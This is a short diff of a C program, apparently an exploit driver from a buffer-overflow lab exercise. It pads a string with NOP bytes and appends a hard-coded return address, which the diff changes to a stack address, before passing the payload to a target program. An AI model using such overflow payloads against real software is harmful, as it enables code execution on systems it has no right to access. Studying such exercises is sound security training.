@@ -19,7 +19,7 @@ int main(void)
   {
   	strcat(str, "\x90");
   }
-  strcat(str, "\xa0\x3d\xe4\xb7");
+  strcat(str, "\x97\xff\xff\xbf");
 
   args[0] = TARGET;
   // max input size is 4 * 5 = 20
